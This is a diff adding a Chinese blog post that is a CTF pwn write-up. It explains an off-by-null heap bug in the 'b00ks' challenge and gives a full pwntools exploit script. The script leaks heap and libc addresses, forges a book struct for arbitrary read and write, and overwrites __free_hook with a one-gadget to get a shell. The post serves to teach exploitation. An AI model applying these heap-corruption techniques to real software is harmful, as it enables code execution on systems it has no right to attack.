@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="hustcw">
+
+
+
+<meta name="description" content="写在前面 经典off-by-one的利用，而且是只有单字节null溢出。配合edit和show获得任意地址读写的能力，有趣的一点是在不用free的情况下就可以leak libc。这种题patch free就没有意义啦">
+<meta name="keywords" content="pwn,heap,off-by-one">
+<meta property="og:type" content="article">
+<meta property="og:title" content="堆上的off-by-null">
+<meta property="og:url" content="https://hustcw.github.io/2019/09/24/堆上的off-by-null/index.html">
+<meta property="og:site_name" content="Hustcw">
+<meta property="og:description" content="写在前面 经典off-by-one的利用，而且是只有单字节null溢出。配合edit和show获得任意地址读写的能力，有趣的一点是在不用free的情况下就可以leak libc。这种题patch free就没有意义啦">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-09-23T18:41:39.190Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="堆上的off-by-null">
+<meta name="twitter:description" content="写在前面 经典off-by-one的利用，而且是只有单字节null溢出。配合edit和show获得任意地址读写的能力，有趣的一点是在不用free的情况下就可以leak libc。这种题patch free就没有意义啦">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Hustcw" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/img/favico.png">
+
+
+
+    <link href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>堆上的off-by-null | Hustcw</title>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.1/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdnjs.cloudflare.com/ajax/libs/scrollReveal.js/3.4.0/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/assets/img/MyAvatar.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">hustcw</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://github.com/Hustcw" title="GitHub"></a>
+                            
+                                <a class="fa Email" href="mailto:hustcw1998@gmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/angr/">angr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/crypto/">crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/formatstr/">formatstr</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/glibc/">glibc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/heap/">heap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ida/">ida</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mac/">mac</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/machine-learning/">machine learning</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/off-by-one/">off-by-one</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/plan/">plan</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/rop/">rop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/study/">study</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/zip/">zip</a></li></ul>
+                    </div>
+                </section>
+                
+                
+                
+
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">hustcw</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/assets/img/MyAvatar.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">hustcw</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://github.com/Hustcw" title="GitHub"></a>
+                            
+                                <a class="fa Email" target="_blank" href="mailto:hustcw1998@gmail.com" title="Email"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-堆上的off-by-null" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2019/09/24/堆上的off-by-null/" class="article-date">
+      <time datetime="2019-09-23T18:17:17.000Z" itemprop="datePublished">2019-09-24</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      堆上的off-by-null
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/off-by-one/">off-by-one</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2><span id="写在前面">写在前面</span></h2><blockquote>
+<p>经典off-by-one的利用，而且是只有单字节null溢出。配合edit和show获得任意地址读写的能力，有趣的一点是在不用free的情况下就可以leak libc。这种题patch free就没有意义啦<br><a id="more"></a></p>
+</blockquote>
+<h2><span id="漏洞点">漏洞点</span></h2><p>my_read函数没有处理好边界，可以溢出一个null字节。首先pointer array填满之后，被分配到第一个chunkptr覆盖。导致show author的时候就可以leak heap了。接着通过凑布局的方法，再次溢出author name可以把array[0]的最低字节改成null，想办法让它指向array[0]的description。而只要在这之前给array[0]的description里通过leak的heap地址伪造好fake struct，通过show和edit就可以任意地址读写一次。如果让description指向其他的stuct_description_ptr,修改1的description就可以修改其他的description_ptr，那么真正做到多次任意地址读写。<strong>但是程序开了PIE,并且不能改got,必须leak libc</strong>，而分配和释放堆的顺序又让leak出一个libc地址很难。一个有趣的trick:<strong>因为没有约束description的size，可以分配一个超大的（大于132k的chunk），这样就会调用mmap分配地址，而这个地址和libc的偏移是固定的，而且这个地址会记录在struct中，struct地址又可以算出来。通过任意地址读写就能leaklibc了。</strong></p>
+<h2><span id="exp">exp</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># encoding: utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io = process(<span class="string">'b00ks'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = remote('')</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(name, description, description_size)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">    io.sendline(str(len(name)))</span><br><span class="line">    io.recvuntil(<span class="string">'chars): '</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">'size: '</span>)</span><br><span class="line">    io.sendline(str(description_size))</span><br><span class="line">    io.recvuntil(<span class="string">'description: '</span>)</span><br><span class="line">    io.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printall</span><span class="params">()</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'4'</span>)</span><br><span class="line">    <span class="keyword">return</span> io.recvuntil(<span class="string">'Author: '</span>)+io.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'delete: '</span>)</span><br><span class="line">    io.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(id, content)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'3'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'edit: '</span>)</span><br><span class="line">    io.sendline(str(id))</span><br><span class="line">    io.recvuntil(<span class="string">'description: '</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_author</span><span class="params">(name)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.sendline(<span class="string">'5'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 方便gdb debug，输入偏移地址就好</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DEBUG</span><span class="params">(bps = [], mems = [])</span>:</span></span><br><span class="line">    cmd = <span class="string">"set follow-fork-mode parent\n"</span></span><br><span class="line">    base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>) </span><br><span class="line">    cmd += <span class="string">''</span>.join([<span class="string">'b *&#123;:#x&#125;\n'</span>.format(b + base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    cmd += <span class="string">''</span>.join([<span class="string">'x/10gx &#123;:#x&#125;\n'</span>.format(m+base) <span class="keyword">for</span> m <span class="keyword">in</span> mems])</span><br><span class="line">    cmd += <span class="string">""</span></span><br><span class="line">    raw_input(<span class="string">"DEBUG: "</span>)</span><br><span class="line">    gdb.attach(io, cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用off by null泄露堆地址</span></span><br><span class="line">io.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">io.sendline(<span class="string">'a'</span>*<span class="number">32</span>)</span><br><span class="line">create(<span class="string">"a"</span>*<span class="number">0x80</span>, <span class="string">"b"</span>*<span class="number">0x30</span>, <span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># print(hex(u64((printall()[-7:-1]).ljust(8,'\x00'))))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用mmap分配一个块，这个地址会记录在bookstruct的descript_ptr里，和libc有offset的固定偏移</span></span><br><span class="line">first_book_struct = u64((printall()[<span class="number">-7</span>:<span class="number">-1</span>]).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">first_book_description = first_book_struct - <span class="number">0x40</span></span><br><span class="line">create(<span class="string">"c"</span>*<span class="number">8</span>, <span class="string">'test'</span>, <span class="number">1320000</span>)</span><br><span class="line">offset = <span class="number">0x4ca010</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 往struct1的description里写上一个fake struct，伪造struct的descptr可以任意地址读写</span></span><br><span class="line"><span class="comment"># 读struct2的descript_ptr减去固定偏移可以泄露libcbase</span></span><br><span class="line"><span class="comment"># 最后写malloc_hook即可</span></span><br><span class="line">second_book_desc_ptr = first_book_struct + <span class="number">0x30</span> + <span class="number">0x20</span> + <span class="number">0x10</span></span><br><span class="line">fake_struct = p64(<span class="number">1</span>)+p64(second_book_desc_ptr)+p64(second_book_desc_ptr)+p32(<span class="number">0x30</span>)</span><br><span class="line">change(<span class="number">1</span>, fake_struct)</span><br><span class="line">print(hex(second_book_desc_ptr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用off by one修改bss段的array数组的第一个指针低位，指向fake struct</span></span><br><span class="line">change_author(<span class="string">'a'</span>*<span class="number">31</span>+<span class="string">'\x00'</span>*<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">'4'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Description: '</span>)</span><br><span class="line">libcbase = u64((io.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]).ljust(<span class="number">8</span>,<span class="string">'\0'</span>)) - offset</span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">onegadget = libcbase + <span class="number">0x4f322</span> <span class="comment"># 0x4f322</span></span><br><span class="line"><span class="comment"># print(hex(libcbase))</span></span><br><span class="line"><span class="comment">#struct       &lt;-- array[0]</span></span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment"># id          &lt;-- array[1]</span></span><br><span class="line"><span class="comment"># name                 |</span></span><br><span class="line"><span class="comment"># description ----------</span></span><br><span class="line"><span class="comment"># size</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment"># array[s2_description_ptr,s2_struct_ptr]</span></span><br><span class="line"><span class="comment"># struct2's description ptr == malloc_hook</span></span><br><span class="line">change(<span class="number">1</span>, p64(malloc_hook))</span><br><span class="line"><span class="comment"># DEBUG([0xA89], [0x202040, 0x202060])</span></span><br><span class="line">change(<span class="number">2</span>, p64(onegadget))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2019/09/24/堆上的off-by-null/">堆上的off-by-null</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">hustcw</a></p>
+        <p><span>发布时间:</span>2019-09-24, 02:17:17</p>
+        <p><span>最后更新:</span>2019-09-24, 02:41:39</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2019/09/24/堆上的off-by-null/" title="堆上的off-by-null">https://hustcw.github.io/2019/09/24/堆上的off-by-null/</a>
+            <span class="copy-path" data-clipboard-text="原文: https://hustcw.github.io/2019/09/24/堆上的off-by-null/　　作者: hustcw" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/08/12/装IDA-Key-Patch/">
+                    windows IDA key-patch
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">1.</span> <span class="toc-text">写在前面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">2.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#null"><span class="toc-number">3.</span> <span class="toc-text">exp</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"堆上的off-by-null　| Hustcw　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+<!-- 添加打赏功能 -->
+
+
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/08/12/装IDA-Key-Patch/" title="下一篇: windows IDA key-patch">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/09/24/堆上的off-by-null/">堆上的off-by-null</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/12/装IDA-Key-Patch/">windows IDA key-patch</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/08/08/最近的事/">最近的事情</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/29/荒废已久的pwn复习总结/">荒废已久的pwn复习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/03/ret2dl-runtime-resolve/">ret2dl_runtime_resolve</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/20/OSX装angr/">OSX装angr</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/19/DDCTF-2019-WriteUp/">DDCTF 2019 Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/11/堆利用——布局内存任意地址写/">堆利用——布局内存任意地址写</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/05/转载-IDA代码类型转换/">转载:IDA代码类型转换</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/03/VMware-Fusion-NAT无法连接网络/">VMware Fusion NAT无法连接网络</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/堆利用/">堆利用</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/02/padding-oracle-attack/">padding oracle attack</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/29/格式化字符串/">格式化字符串</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/openssl相关知识/">openssl相关知识</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/xargs命令/">xargs命令</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/一个有趣的包——tqdm/">一个有趣的包——tqdm</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/26/python-gpg模块使用/">Python-gnupg Usage</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/23/ctf中常用模块之binascii/">ctf中常用模块之binascii</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/22/underfitting-overfitting/">underfitting & overfitting</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/21/现代密码学——对称加密和非对称加密/">密码学小整理</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/20/编译glibc遇到的问题/">编译glibc遇到的问题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/19/二进制的一些基本操作/">准备pwn环境的一些基本操作</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/17/64位ROP练习/">64位ROP练习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/16/zip的选择明文攻击/">zip的选择明文攻击</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/03/16/docker基本命令/">docker基本命令</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2018-2019 hustcw
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdnjs.cloudflare.com/ajax/libs/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#414141", "#e5a859", "#f5dfc6", "#847e72", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 1;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+    <script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
